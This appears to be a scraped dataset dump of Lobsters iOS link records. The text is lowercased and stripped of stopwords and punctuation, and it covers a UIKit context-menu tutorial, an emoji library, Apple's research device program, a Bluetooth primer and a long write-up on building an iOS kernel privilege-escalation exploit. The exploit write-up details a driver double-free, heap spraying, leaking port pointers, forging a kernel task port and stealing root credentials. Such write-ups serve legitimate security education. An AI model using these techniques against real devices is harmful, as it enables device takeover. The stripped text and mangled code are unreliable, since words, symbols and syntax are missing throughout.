preview even appear could try duplicate ourself copy layoutimpacting attribute asking slight layout difference instead ensure get view appears exactly text view use snapshot view guard let snapshot selfsnapshotview afterscreenupdates false else return nil next need create preview target reading documentation might notice uitargetedpreview view parameter initializer wonder even necessary well try use initializer snapshot view app crash snapshot view added view hierarchy therefore target uikit know put uipreviewtarget describes exactly need know container view preview placed simply self since text view well inside target container center preview anchored want anchor center point preview view text link appears exact place text line rects determine overall bound link text fragment since preview bounding rectangle link text use center rect enclosing text var minx cgfloatgreatestfinitemagnitude maxx cgfloatgreatestfinitemagnitude miny cgfloatgreatestfinitemagnitude maxy cgfloatgreatestfinitemagnitude rect textlinerects minx min rectminx minx maxx max rectmaxx maxx miny min rectminy miny maxy max rectmaxy maxy let textlinerectscenter cgpoint x minx maxx minx maxx let target uipreviewtarget container self center textlinerectscenter finally construct return targeted preview return uitargetedpreview view snapshot parameter parameter target target run preview animation limited text link look pretty good unfortunately still pretty big problem link near enough text particularly span multiple line text visually near link partly visible preview happens uikit take text line rects passed uipreviewparameters stuff expand round corner merge creating bubble shape mask preview view resulting path unfortunately mask text beforehand mask everything one pas need giving uikit preview view mask directly around text preventing anything else seeping something similar uikit need generate path contains entirety text line rects nothing note convex hull problem since need path contains point rectangle need smallest path encloses implementing particularly interesting left exercise reader assuming custom initializer uibezierpath wrappingaroundrects produce path array cgrects obvious thing mask view path using layer mask cashapelayer let path uibezierpath wrappingaroundrects textlinerects let masklayer cashapelayer masklayerpath pathcgpath snapshotlayermask masklayer running however quite work everything look exactly nearby text appearing inside preview animation might check documentation think try visiblepath attribute uipreviewparameters unfortunately entirely override mask generated textlinerects initializer exact opposite current problem seems using uipreviewparameters textlinerects initializer uikit silently discard existing layer mask view provided preview view also true uiview mask caused great deal hairpulling disabled preview parameter stuff mask suddenly started working simple workaround apply mask snapshot view embed snapshot inside additional container view size use container view uitargetedpreview let snapshotcontainer uiview frame snapshotbounds snapshotcontaineraddsubview snapshot return uitargetedpreview view snapshotcontainer parameter parameter target target link text visible preview animation expands nicely full preview video metadata masked style width margin auto display block title screen recording link previewed dismissed link text animating back starting position upon dismissal still one small detail keeneyed reader may noticed safari dismissing full preview animates back preview view spring back original position implementation however preview view controller animate back preview view however instead returning original position disappears middle screen still one uicontextmenuinteractiondelegate method need implement contextmenuinteraction previewfordismissingmenuwithconfiguration similar previewforhighlighting method method take interaction context menu configuration creating uitargetedpreview used dismissal animation since want preview go back location dismissing came expanding cache targeted preview already constructed highlight method return dismissal method private weak var activetargetedpreview uitargetedpreview func contextmenuinteraction interaction uicontextmenuinteraction previewforhighlightingmenuwithconfiguration configuration uicontextmenuconfiguration uitargetedpreview let preview uitargetedpreview view snapshotcontainer parameter parameter target target selfactivetargetedpreview preview return preview func contextmenuinteraction interaction uicontextmenuinteraction previewfordismissingmenuwithconfiguration configuration uicontextmenuconfiguration uitargetedpreview return selfactivetargetedpreview dismissing preview animates back link text originally came
9,Lobsters,ios,Apple iOS,Streamoji is a custom emoji rendering library for iOS,https://github.com/getstream/streamoji,streamoji custom emoji rendering library io,stream usage define emojis configure uitextview example installation cocoapods author cardoso matheus getstreamio license,custom emojis fun way bring life customizability apps available popular apps slack discord twitch however io sdk nt provide straight forward support custom emojis box couple code line away adding app library streamoji custom emoji rendering library io support gif image unicode load url local asset caching taken care performance fast made folk stream usage define emojis first step define custom emojis dictionary key shortcode emoji emojisource uhmmm source emoji gif image local asset remote url even unicode character also define alias alternate code let exampleemojis string emojisource babyyoda imageasset babyyodasoupgif bananadance imageasset bananadancegif excuseme imageasset excusemegif partyparrot imageasset partyparrotgif thisisfine imageasset thisisfinefiregif imageasset whatpng homerdisappear imageasset homerdisappeargif letmein imageurl http githubcomgetstreamstreamojiblobmainmetaemojisletmeingif rawtrue smiley character heart character banana alias bananadance parrot alias partyparrot configure uitextview defining emojis call uitextviewconfigureemojis textviewattributedtext nsattributedstring string bananadance streamoji partyparrot babyyoda uitextview excuseme support gif thisisfine image local file homerdisappear remote file letmein unicode smiley textviewconfigureemojis exampleemojis rendering highestquality also tweak couple rendering option quality scale relation surrounding text example run example project clone repo run pod install example directory first installation streamoji available cocoapods install simply add following line podfile author cardoso matheus getstreamio license streamoji available mit license see license file info
10,Lobsters,ios,Apple iOS,Apple Security Research Device Program,https://developer.apple.com/programs/security-research-device/,apple security research device program,applying program initial application period end august applicant receive response end august apply,applying program start application sign apple id associated apple developer program membership enrolling organization need authority accept legal agreement behalf organization need list name everyone access security research device approved apple individual acknowledge responsibility initial application period end august receive response end august apply
11,Lobsters,ios,Apple iOS,Writing an iOS Kernel Exploit from Scratch,https://secfault-security.com/blog/chain3.html,writing io kernel exploit scratch,writing io kernel exploit scratch introduction article series github job test environment http opensourceapplecom http ipswme bug analysis iokit reversing iokit driver opensourced xnu kernel presentation stefan esser bug exploitation triggering bug exploitation kalloc zone spraying via iosurface object one freebsd hitb presentation ziva creating information leak spray dangling port pointer zone garbage collection controlling targetport creating kernel task port elevate privilege conclusion step acknowledgement ian adam ben siguza stefan luca marco,writing io kernel exploit scratch posted july introduction august ian beer samuel google project zero published comprehensive article series several exploit chain professional threat actor target io user describes full detail exploit chain series good starting point writing custom exploit mentioned vulnerability writing full exploit without experience io overwhelming task though actual vulnerability well described many obstacle way example exactly vulnerable function triggered even deploy debug exploit code moreover described vulnerability exploited several technique need chained together order get full access system required information io exploit developer aspirant scattered many article book presentation therefore aim blog post take one described kernel vulnerability write exploit scratch collect background information development process cohesive article could act reference beginner article structured follows first step step required set test environment outlined subsequently vulnerability trigger analysed detail also includes short introduction iokit driver along accompanying reverse engineering process initial trigger vulnerability described remainder article show develop full exploit using common technique used io exploit stepbystep particular article investigate chain original article series focus kernel exploit vulnerability introduced io mitigated io last version release also doublefree vulnerability seems like good choice get first contact io without knowing much detail several subsystem sandbox escape original chain investigated instead exploit us technique revealed recently siguza moreover noted neither full jailbreak implement postexploitation technique inthewild exploit chain due nature article discussing exploit already described ian beer content overlapping original article however intention article fill possible potential gap might occur exploit developer new io many described technique applicable current io version well mitigated currently though hope article good starting point io exploit developer aspirant nevertheless find source code github one last thing diving exploit enjoy stuff like might want check job page time publishing hiring test environment researching io requires xnu open source part kernel well io kernelcaches former found http opensourceapplecom latter could found http ipswme development exploit iphone io used iphone using vulnerable driver io version work suggested use mac xcode installed build system xcode free signing identity iphone development needed execute security findidentity terminal find fingerprint identity copy fingerprint makefile value variable signingid possible use jailbroken iphone development strict requirement jailbroken advantage sandbox escape needed order run exploit code delivered article simple remove application overhead turn function exploit source code main function copy correct entitlement via ldid binary iphone copy binary application start app via ssh jailbreak available following approach may used export certificate identity file read openssl using following command terminal security export identity f cert k loginkeychain openssl cert search iphone development certificate copy value ou team identifier copy value xxx file entitlementsplist file already format needed exploit sandbox escape exploit ready building installation build exploit make install ideviceinstaller directory case fails might want build install demo application via xcode trust developer certificate via setting app iphone possible install exploit application well run debug device support file correct io version needed found instance github obtaining file open two terminal window first window run idevicesyslog grep command print debug message exploit second window run ideviceimagemounter developerdiskimagedmg idevicedebug exploit start iphone debug message appear first terminal window bug analysis already described introduction ian beer covered important detail bug depth article series however someone new io exploit development might several question actual reverse engineering exploitation process vulnerability aim post explain exploit development process scratch section article address kernel vulnerability also cover several fundamental important iokit vulnerability present iokit driver iokit collection several resource framework library streamline process device driver development iokit driver developed subset c complicates reverse engineering process lead specific vulnerability exploitation technique iokit driver socalled kernel extension io kernel prelinked kernelcache binary information extension available prelinkinfo segment kernelcache modern disassemblers like ida pro ghidra aware article important aspect iokit driver give attacker interface kernel space every iokit driver provides one ore socalled user client provide external method user space process comparable system call seems natural research driver order exploit kernel many researcher past snag though many user client accessible sandboxed process hence kind sandbox escape often required first true bug exploited article well ian writeup discus escape leverage vulnerability accessible web process already mentioned introduction exploit described blog post utilise technique published siguza later reversing iokit driver bug discussed identified kernelcache ian beer used kernelcache image io beta available public anymore apple incidentally published fully symbolized kernelcache actually symbol stripped removed download completely therefore article give short introduction manually reversing iokit driver like stated previous section iokit user client provide external method user space process comparable c vtables function pointer method defined table const section text segment table array function pointer though ioexternalmethoddispatch structs struct defined iouserclienth opensourced xnu kernel struct ioexternalmethoddispatch ioexternalmethodaction function checkscalarinputcount checkstructureinputsize checkscalaroutputcount checkstructureoutputsize besides actual function pointer ioexternalmethodaction function several size field struct size field serve purpose describing size input output value respective ioexternalmethodaction indepth description value provided later article order identify external method iokit driver one use following approach every user client implement virtual method externalmethod take function pointer table call actual method via dispatch method external method table stored const section externalmethod contains hardcoded pointer table therefore aim first identify externalmethod implementation respective iokit driver inspect external method table actually possible reconstruct complete iokit user client tree described presentation stefan esser however also possible easily find externalmethod specific iokit driver manually every iokit user client class called meta class meta class constructed object instance user client constructed constructor meta class object expects name actual class argument therefore searching iokit user class name possible find method meta class user client constructed article corresponding class name method found searching reference string meta class constructor osmetaclass called pointer method table meta class stored object vtable actual iokit user client object located meta class vtable following pointer reveals iokit user vtable already mentioned every iokit user client implement externalmethod done overwriting method parent class iokituserclient needed compare vtable one iokituserclient already identified disassembler iokituserclient method remaining symbol io kernelcache method different function pointer vtable overwritten method one externalmethod externalmethod contains pointer external method table user client seen following image needed identify vulnerable function exploited article bug little primer enough research bug vulnerability present one external method found identified external method table discussion recap explanation given ian beer writeup first method method table called createdecoder second one called destroydecoder could identified reverse engineering method simply using symbolized io beta kernelcache actual usage method interest driver something video decoding acceleration interested though former method allocates small memory chunk store pointer user client destroydecoder method deallocates chunk fails nullout pointer classical doublefree vulnerability occurs turned useafterfree vulnerability allocation observed one call made createdecoder function shown following code excerpt allocatememory thiscall allocatememory allocinstruct allocoutstruct kernreturnt ret kernmeminfo tmpmem kernmeminfo allocinstruct smdlog assert broken n allocinstruct return bzero tmpmem kernmeminfo iomalloc bzero allocoutstruct tmpmem ret allocatekernelmemory allocinstruct surfaceid ulong allocinstruct allocinstruct allocinstruct task msvdxclientmeminfo allocoutstruct tmpmem prev kernmeminfo next tmpmem tmpmem return ret allocatememory directly called createdecoder line byte chunk allocated line pointer chunk saved user client object line line old pointer struct saved double linked list one would assume destroydecoder would simply free allocated chunk associated former created decoder indeed observed next excerpt deallocatememory longlong deallocatememory tmpbuf longlong retvalue kernmeminfo prev kernmeminfo kernmeminfo nextsprev kernmeminfo tmpbuf kernmeminfo retvalue else retvalue deallocatekernelmemory prev prev prev kernmeminfo prev next next head last next prev next null nextsprev listheadprev next kernmeminfo nextsprev next prev nextsprev prev iofree return retvalue free byte chunk seen line tmpbuf memory region previously copied user struct tmpbuf point byte chunk free unlinking chunk double linked list executed however chunk pointer never deleted user client neither happen function would expected function called destroydecoder subsequent call therefore check line never true possible free chunk multiple time verified creating small proofofconcept program call destroydecoder twice row done shown next section discus exploit bug detail exploitation section discus exploit bug shown previous section triggering bug exploitability bug discussed trigger built method table reviewed order find createdecoder destroydecoder called following excerpt show entry two method table smethods ioexternalmethoddispatch ff ff ff addr createdecoder functio ff ff ff checkscalarinputcount checkstructureinputsize checkscalaroutputcount checkstructureoutputsize ioexternalmethoddispatch ff ff ff addr destroydecoder function ff ff ff checkscalarinputcount checkstructureinputsize checkscalaroutputcount checkstructureoutputsize two different kind argument passed external method iokit driver one kind scalar argument ie normal argument like integer one structure argument exact definition structure reverse engineered however size structure given checkstructureinputsize checkstructureoutputsize dynamic length argument possible would indicated value bit high respective field different way call external method checkstructureinputsize checkstructureoutputsize nonzero value method table createdecoder detroydecoder suitable use ioconnectcallstructmethod passing scalar argument struct argument full function prototype ioconnectcallstructmethod follows kernreturnt ioconnectcallstructmethod machportt connection selector const void inputstruct sizet inputstructcnt void outputstruct sizet outputstructcnt selector index method method table hence createdecoder destroydecoder inputstruct outputstruct pointer structs allocated user space copied kernel space user client inputstructcnt outputstructcnt equal size value defined method table dynamic length needed would indicated size method table size argument set actual size struct user space remaining argument connection external method call performed process establish connection iokit driver respectively user client without going much internal detail iokit every iokit driver inherits ioservice ioservices registered creation allows query moreover ioservice create user client connection internally represented socalled mach port macos io specific ipc mechanism discussed later article connection establishment implemented function ioserviceopen ioservice found via mentioned registry implementation process found eg file finished exploit published article understanding use ioconnectcallstructmethod reverse engineered input struct filled createdecoder destroydecoder first suspicious call createdecoder value offset input struct passed allocatekernelmemoryinternal via allocatememory passed along virtual method call method fails error message logged viewed via dmesg jailbroken device allocatekernelmemory kallocmaptypeiosurface lookupsurface failed apparently value id iosurface frame buffer object shareable process iosurface created first implemented another ioservice called iosurfaceroot similarly method table user client found reviewed first iosurfacerootuserclient smethoddescs aa ioexternalmethoddispatch ff ff ff ff ff ff aa addr iosurfacerootuserclient screatesurface function ff ff ff checkscalarinputcount ff ff ff ff ffffffffh checkstructureinputsize checkscalaroutputcount checkstructureoutputsize seen screatesurface first external method create iosurface similar createdecoder called struct argument first dynamic length output count fixed input screatesurface function dictionary xml format dictionary contains detail frame buffer allocated however enough provide key iosurfaceallocsize value therefore enough give following string dict key iosurfaceallocsize key integer integer dict output struct contains id iosurface id used field value input struct createdecoder createdecoder called needed call destroydecoder twice done similarly content input struct irrelevant used test trigger exploit code shipped article may used done modify exploit function exploitm call triggerbug call triggerfree crash io primitive turned useafterfree vulnerability subsequently privilege escalation shown next section exploitation bug analysed previous section section discus possible exploitation path general idea turn doublefree useafterfree condition leverage condition order obtain arbitrary memory write primitive ultimate goal exploit create kernel task port mach task port allow full access respective mach task access kernel task port hence provides convenient mean perform arbitrary modification patching kernel code order create kernel task port several thing required way read kernel memory address required kernel task port faked way trick kernel using userprovided data task port best achieved useafterfree setting involving mach port turning doublefree issue useafterfree required kalloc zone spraying via iosurface object order find way turn doublefree useafterfree vulnerability worthwhile take quick glance dynamic memory management io kernel io macos implement zone allocator similar one freebsd general zone associated struct defined kernel allocation zone therefore fixed size example zone called ipcports allocate struct ipcport object used implement mach ipc mechanism mentioned last section struct allocated allocator first look memory page already associated zone page still unallocated space big enough hold struct one chunk page allocated pointer chunk returned page full whole new page allocated exclusively given zone detail mechanism could found presentation stefan esser eg hitb presentation special case anonymous allocation done iomalloc note iomalloc used allocatememory function called createdecoder several zone named kallocx x power anonymous allocation allocator take zone smallest chunk size fit requested allocation case discussed vulnerability byte allocated hence allocation chunk zone allocation exploit vulnerability therefore must come zone exploit discussed article achieves way similar one discussed ian writeup modification first memory spray technique used discussed already mentioned presentation stefan esser expanded adam donenfeld exploit named ziva iosurface object introduced previous section interesting feature possible associate property iosurface consist osdictionary object osdictionary object keyvalue store value object eg osnumber osdata object interesting part feature property given kernel space remember iosurface object created kernel space special ioservice xml format parsed internally function osunserializexml data ie binary data associated key dictionary osdata object allocated come handy osdata object internally allocate space stored data one anonymous kallocx zone hence byte binary data associated key data osdata object stored associating multiple osdata object property iosurface possible spray zone eventually allocate chunk previously freed call destroydecoder property set via external method ssetvalue iosurfaceroot user client selector method want dynamical length input struct content follow specific scheme must reverse engineered reviewed following code excerpt setvalue called ssetvalue iosurfacerootuserclient setvalue iosurfacevalueargs unsigned int iosurfacevalueresultargs ulonglong setvalue iosurfacerootuserclient void structureinput uint inputsize void structureoutput uint surfaceid osobject unserializedobj osarray array osobject value osobject key osstring keystring ulonglong ret iosurfaceclient surfaceclient ret surfaceid uint structureinput iolocklock lock surfaceid uint nsurfaces surfaceclient iosurfaceclientarray surfaceid int surfaceclient surfaceclient iosurfaceclient unserializedobj osunserializexml char longlong structureinput int structureinput inputsize int char longlong structureinput osstring unserializedobj osobject array osarray safemetacast osmetaclassbase unserializedobj osmetaclass gmetaclass array osarray value osobject code array vtable osarray getobject key osobject code array vtable osarray getobject key osobject keystring osstring else keystring osstring safemetacast osmetaclassbase key osmetaclass gmetaclass value osobject key osobject keystring osstring setvalue surfaceclient keystring uint value structureoutput surfaceid int surfaceclient surfaceid ret ulonglong surfaceid first id parsed read line value actual property encoding located offset shown line call osunserializexml occurs line show osarray expected could deduced following gmetaclass pointer point meta class osarray osarray found two virtual method call occur line reversed like shown previous section way found osarray getobject called twice second value osstring first one osobject instance known property osdictionary object could assumed osstring key object actual data following call setvalue line could confirmed spray therefore following encode property consists array osdata object contains byte zero lead enough allocation one osdata object allocates freed chunk destroydecoder small catch read stefan presentation data encoded luckily exploit actually written objectivec method easily conversion normal cstring one reverse engineering setvalue known input struct constructed following way iosurface id array array data data time data data array string key string array calling ssetvalue via ioconnectcallstructmethod eventually allocate byte chunk implemented function spraykernelheapwithzeroes accompanied exploit creating information leak spray could achieved actually much point freed byte chunk using destroydecoder reallocated chunk using heap spraying approach ultimate goal obtaining access kernel task port requires information leakage primitive fake kernel task port built containing correct kernel pointer end iosurface property another interesting feature using external method sgetvalue called via selector property iosurface object could read userspace possible leak interesting value chunk could read exploit process exactly done next remember currently two pointer chunk one decoder one property sprayed one free chunk calling destroydecoder via function triggerfree lead crash chunk allocated albeit allocation happened performing heap spray two pointer decoder property point free byte chunk whatever data stored chunk future read using sgetvalue could leaked chunk technique often used past used current point leak pointer struct ipcport object port ipc mechanism already mentioned several time article aim get much mechanism however port feature come handy io exploitation one feature every socalled mach message sent port associated type describes content message one type called machmsgoolportsdescriptor allows send port process via another port case data message consists array port name sent saved variable type machportt port allocated allows exploit feature via achieved information leak following property every port name contained message data converted pointer struct ipcport port array pointer stored kallocx zone smallest chunk fit array pointer hence port sent chunk allocated port pointer pointer byte big system sending lot mach message one message allocate freed byte chunk simply using sgetvalue outlined allows read kernel pointer struct ipcport port exploit process sends moreover message received port machmsgoolportsdescriptor message sent stay portinternal message queue long case byte chunk stay allocated containing port pointer increase chance allocate target byte chunk zone sprayed via sending message spray implemented function oolportsdescriptorspray exploit different original exploit described ian writeup exploit code actually leak three port pointer function leakportpointer two pointer two port associated exploit process called targetport owntaskport another one point host name port last one special port owned process four port set machportnull internally represented null pointer reason leak described later article create exploitable useafterfree condition leak targetport would already sufficient described remainder section three port pointer contained byte chunk could read using sgetvalue iosurface object sgetvalue called like external method similar ssetvalue first byte input struct contain iosurface id offset follows key property osdata object allocated containing zero easy identify pointer using memmem like original exploit output struct search implemented function searchforpointerleak later creating fake kernel task port information obtained via leak required dangling port pointer next step exploit turn vulnerability useafterfree condition mach port allow tricking kernel treating userprovided data mach port turn enable exploit craft fake kernel task port leveraging information leak destroydecoder called one last time via triggerfree iosurface property trick used function explains usage machportnull important destroydecoder attempt unlink chunk doublelinked list important prev next set null well pointer beginning chunk latter important otherwise deallocatekernelmemoryinternal called eventually destroydecoder would try call virtual method time data string property contains three leaked port pointer pointer port saved targetport stored twice osdata object though remainder byte filled zero order understand achieve useafterfree condition mach port following observation important machmsgoolportsdescriptor message sent eventually ipcrightcopyin called function increase reference counter every port contained message via call ipreference kernreturnt ipcrightcopyin ipcspacet space machportt name ipcentryt entry machmsgtypenamet msgtname booleant deadok ipcobjectt objectp ipcportt sorightp case machmsgtypecopysend port ipsrights ipreference port ipunlock port port destroyed via user space function machportdestroy queued message port destroyed well case machmsgoolportsdescriptor message ipcobjectdestroy called every port static unsigned int ipckmsgcleaninvaliddesc void ipckmsgcleanbody unused ipckmsgt kmsg machmsgtypenumbert number machmsgdescriptort saddr case machmsgoolportsdescriptor destroy port right carried message j j dsc count j ipcobjectt object object j iovalid object continue ipcobjectdestroy object dsc disposition ipcobjectdestroy finally release reference port via call iprelease mean reference counter message increased every machmsgoolportsdescriptor sent spray decreased message contained byte chunk destruction port reference targetport every process reference allocated port port table every message spray via machmsgoolportsdescriptor message mean destroying receiving port lead free targetport reference counter decreased port table still contains dangling reference port though therefore still used eventually doublefree chunk turned useafterfree vulnerability involving port zone garbage collection dangling port pointer useful io exploit try achieve typically turn controlled port socalled kernel task port due capability port kernel task port allows write read memory anywhere kernel user space eventually used get root right exploit process fulfill aim exploit developer find writeprimitive attackercontrolled port exploit draw another wellestablished technique trigger zone garbage collection ipcports zone garbage collection context memory kernel zone something different maybe known reader managed programming language io mean following page associated memory zone completely empty chunk freed stay associated zone hence new chunk would allocated page completely new page associated zone however io mechanism called garbage collection would deassociate empty page zone memorypressure ie lot new chunk allocated via zone allocator reviewed function zallocinternal following line taken iszonemapnearingexhaustion threadwakeup eventt vmpageoutgarbagecollect iszonemapnearingexhaustion test zone memory allocator pressure booleant iszonemapnearingexhaustion void size zonemap size capacity vmmapmax zonemap vmmapmin zonemap size capacity zonemapjetsamlimit return true return false size line memory amount currently allocated zone capacity hand line memory amount available allocation zone allocator ifclause line test size available capacity case following function eventually called due threadwakeup void vmpageoutgarbagecollect int collect collect iszonemapnearingexhaustion woken zone allocator zonemapexhaustion jetsam bail calling zonegc trigger zonemapexhaustion jetsam fall subsequent operation clear bunch cache might allocate zone memory eg vmmap operation would need vm map entry since zone map almost full point could end panic need quickly jetsam process exit could happen woken relieve memory pressure zone map also happened near limit time case skip early ok memory pressure persists thread simply woken considerzonegc true considerzonegc call eventually call zonegc turn call dropfreeelements zone latter function go page associated zone drop available reallocation therefore idea following page ipcports hold struct ipcport object targetport completely empty garbage collection allow reallocation particular page next reallocation via method allows writing kernel page give enough opportunity order get control struct ipcport two method already described article better option hence two condition must fulfilled trigger zone garbage collection must targetport freed using primitive described previous section also primitive put zone memory allocator pressure first condition fulfilled applying kind feng page containing targetport filled struct ipcport object belong exploit process possible free port targetport freed achieved allocating big array port called beforeports exploit code fill hole page already associated zone ipcports hopefully lead allocation fresh page zone filled beforeports next targetport allocated followed another port array called afterports containing port latter necessary remainder page containing targetport port beforeports still free could filled port process way complete page filled targetport port beforeports afterports deallocating targetport via primitive destroying port beforeports afterports leave whole page empty moreover exploit probably filled lot page port one containing targetport probability page filled port process low next method trigger garbage collection needed ian beer described method used original exploit method used exploit described function derived ben aka ibsparkes machswap exploit like possible send port via mach message another port also possible send bigger chunk memory via mach message implemented ooldescriptorspray message type machmsgooldescriptor sending machmsgooldescriptor message sending byte data mb allocated substraction byte necessary machmsgooldescriptor message copy header front actual data seen following struct definition struct vmmapcopy int type vmobjectoffsett offset vmmapsizet size union struct vmmapheader hdr entrylist vmobjectt object object kdata kernelbuffer cu due struct alignment first three field consist byte size cukdata beginning actual data message one trace code function actually copy message data kernel space eventually find call vmmapcopyinkernelbuffer static kernreturnt vmmapcopyinkernelbuffer vmmapt srcmap vmmapoffsett srcaddr vmmapsizet len booleant srcdestroy vmmapcopyt copyresult kernreturnt kr vmmapcopyt copy vmsizet kallocsize kallocsize vmsizet cpykdatahdrsz len copy vmmapcopyt kalloc kallocsize function called data size small enough ie smaller kb copy type defined message body copy field machmsgphysicalcopy copy message data already copied kernel space special area memory map used exclusively physically copied data machmsgooldescriptor message line show kalloc called kallocsize byte kallocsize len size data message plus cpykdatahdrsz cpykdatahdrsz defined offset cukdata field struct vmmapcopy seen file vmmaph xnu kernel ie mentioned byte mb memory available iphone trigger garbage collection reliable similar machmsgoolportsdescriptor message memory queue machmsgooldescriptor message allocated anonymous zone due kalloc call hence case monitor garbage collection executed time needed send one machmsgooldescriptor message measured length one millisecond clearly show occured garbage collection afterwards port used trigger garbage collection destroyed order free allocated chunk hence page containing dangling port targetport associated zone next subsection describe used escalate privilege root controlling targetport garbage collection page containing port targetport associated zone however page free must allocated gain control targetport moreover actual page containing targetport must identified probably much allocated garbage collection done function using machmsgooldescriptor message however time sent message contains individual magic value specific offset port field associated struct ipcport object called ipcontext offset value retrieved via function machportgetcontext user space hence ipcontext field overwritten unique value page identifiable calling function original exploit little complicated ipcontext value every port page overwritten however offset port page known previous port pointer leak via iosurface object example port pointer end offset port page would page byte size ipcontext field targetport therefore following offset port offset page ipcontext offset vmmapcopy header subtraction necessary due byte header copied message data explained previous section exploit loop executed sends one machmsgooldescriptor message time via unique port array called sprayports set ipcontext value loop counter resp index sprayports array message sent ipcontext value targetport retrieved via machportgetcontext port sprayports used send specific machmsgooldescriptor message overwritten ipcontext value targetport simply calculated via ipcontext port sprayports directly destroyed freeing page machmsgooldescriptor message dropped aim get control struct ipcport structure via pipe done function controlportviapipe reason pipe enable write page without freeing new write happen possible pipe use buffer cache data written pipe read pipe buffer allocated function pipespace static int pipespace struct pipe cpipe int size vmoffsett buffer size return einval buffer vmoffsett kalloc size return enomem size taken following array static const unsigned int pipesizeblocks pipesize pipesize initially byte allocated buffer increased needed writing byte pipe buffer therefore increased byte reading byte writing new content preserve buffer size sometimes another page freed free page containing targetport happened pipe write occurs hence exploit creates one pipe writes byte identifying pipe overwritten ipcontext magic value trick technique give reliable control field next subsection discus used turn targetport kernel task port used elevate privilege process left exercise reader implement way directly control targetport via pipe without detour using machmsgooldescriptor message creating kernel task port complete control targetport needed create fake kernel task port via function createkerneltaskport exploit code use different technique traverse couple kernel structs necessary information collected finally kernel task port forged exploit relies port pointer leak offset kernel structs fixed io version direct kaslr bypass required read information wellknown arbitrary read technique used leverage function pidfortask like name suggests function read pid given task port ie port belongs exploit process done reviewed following code excerpt kernreturnt pidfortask struct pidfortaskargs args machportnamet args useraddrt pidaddr args pid proct p taskt portnametotaskinspect tasknull err kernfailure goto pftout else p getbsdtaskinfo p pid procpid p err kernsuccess else iscorpsetask pid taskpid err kernsuccess else err kernfailure void copyout char pid pidaddr sizeof int first struct task pointer given port targetport read line done reading kobject pointer struct ipcport targetport next getbsdtaskinfo return bsdinfo pointer line fact pointer struct proc field pid pid process last procpid read pid given bsdinfo bsdinfo pointer pid finally copied user space line however perfect read primitive read bit kernel space targetport completely controlled kobject point anywhere exploit chosen use unused part page contains targetport big enough hold struct task object hence struct task completely controlled setting bsdinfo arbitrary kernel space address minus offset pid struct proc io content address read via procpid copied user space two consecutive read allow read bit value using primitive allows read necessary information forge kernel task port first ipreceiver field former leaked host port read ipreceiver point struct store ipc message received host port host port special port type share coincidence ipreceiver kernel task port necessary field read memory map stored field vmmap kernel task struct read actual kernel task object achieve several structs traversed second task port owntaskport pointer leaked come play first ipreceiver field port read ipreceiver point struct ipcspace object contains pointer task associated process like task object type struct task contains field bsdinfo point struct proc object process ie actual object store information exploit process struct proc linked list beginning contains pointer former created process traversing pointer lead eventually struct proc process recognized pid value struct proc contains pointer kernel task object vmmap field read copied fake kernel task port needed create forged kernel task port used read write arbitrary location memory implemented via function kernelread kernelwrite used elevate privilege last step elevate privilege last bit exploit piece cake elevateprivileges call patchcredentials traverse process list time pid stored struct proc object read pid exploit process pointer struct proc saved pid launchd init process io hence pid ucred field read ucred pointer struct cred object hold information process like uid user running process also mac label latter defines capability process overwriting ucred field struct proc object exploit process ucred field value launchd exploit gain capability launchd le process running full rootprivileges hence possible call setuid gain process running root conclusion step exploit could improved many way first full jailbreak would need work eg order circumvent mandatory code signing apps moreover sandbox exploit used need sign install app turn exploit exploit another sandbox escape eg safari needed furthermore exploit pretty unstable least iphone run sucessfully around reason partly many free dangling pointer reallocation another process happen eventually crash system least dangling pointer certainly lead crash app closed also least detour using machmsgooldescriptor instead pipe directly allocating page factor could improved easily original threat exploited user space process mediaserverd first break sandbox crash stop long iphone dangling pointer problem would associated process would interesting know reliable original exploit code feedback make exploit reliable general welcome mitigation modern version io least garbage collection technique work anymore io reason new mitigation called zonerequire basically check address port mapped zone ipcports another one like technique overwrite port certain value order forge kernel task port work nevertheless better writeprimitive needed though mitigation like smap bypassing would need work however point full kernel privilege escalation exploit developed scratch lot knowledge scattered many article presentation many already developed technique many part io could researched perspective hoped article establish kind starting point io exploit developer novice acknowledgement lot publicly available information significantly eased development exploit particular order ian great writeup adam ziva good introduction ben took inspiration machswap siguza sandbox escape came right time stefan presentation clarified helped many thing luca marco great inspiration well forgotten someone many greets chat
12,Lobsters,ios,Apple iOS,Getting Started with Core Bluetooth,https://ditto.live/blog/posts/getting-started-with-core-bluetooth,getting started core bluetooth,table content introduction core bluetooth basic concept core bluetooth central peripheral service public database exists characteristic core bluetooth concept summary putting practice getting started scanning central online uuid generator advertising peripheral detecting peripheral central received signal strength indicator connecting peripheral discovering characteristic inside peripheral service subscribing characteristic confirming notification peripheral set sending data peripheral sending data central receiving data peripheral receiving data central summary challenge chat app technical reflection limited message size speed limitation additional speed penalty reliable delivery different level control per platform securityprivacy policy backgrounded apps extremely complex api work demand bulletproof error checking handling occasional instability general odd behavior lack encryption conclusion,table content introduction really hard overstate much smartphones tablet transformed world starting iphone device combine gorgeous intuitive touch interface full suite network technology io developer consider stranger networking almost breadandbutter requirement every app day kind rest api handle encoding decoding data remote source side technology aside another huge side networking smartphone never personally explored bluetooth yet sitting writing post wearing wireless headphone apple watch strapped wrist played animal crossing nintendo switch wireless pro controller feel like bluetooth something take granted black box magic never worry daytoday life io engineering career never involved project need side project learn bluetooth apis apple provides buddy max asked interested writing app order demonstrate core bluetooth work following blog post experience jumped chance blog post geared anyone else boat someone might necessarily newbie developing apple platform never stopped learn core bluetooth apis work discus core concept behind core bluetooth parentchild architecture show send basic data device discus pitfall encountered core bluetooth core bluetooth apple public framework official way third party apps integrate bluetooth functionality apps io ipados point core bluetooth abstraction bluetooth low energy ble different classic bluetooth allowing far energy efficient communication support lowpowered device historically meant core bluetooth aimed low powered peripheral device heart rate sensor home automation kind device primarily reside low power state periodically broadcast small tidbit information contrast device using classic bluetooth like game controller wireless headphone much high powered constantly streaming data previously impossible access third party apps however io apple expanded core bluetooth cover classic bluetooth device well public api changed mean much wider variety wireless device became available amazing capability never better time start learning adopt core bluetooth basic concept core bluetooth working core bluetooth necessary become accustomed specific terminology major component service relate central peripheral ble operates traditional serverclient sort model one device act capacity server contains information another act client query information processesdisplays locally device broadcast advertisement called peripheral device scan connect peripheral called central connected usually peripheral act server central act client way core bluetooth operates general example pairing pair bluetooth headphone smartphone smartphone would central headphone would peripheral service obviously type ble device question determine sort capability example heart rate monitor record wearer heart rate smart thermostat would record current temperature location apps built support one specific class device capability example apps tracking user health would interest connecting device nt health related thermostat order encapsulate report capability specific peripheral bluetooth requires peripheral identify class capability service peripheral make discoverable central broadcasting advertisement packet defining main identifying service offer central scanning time detects packet 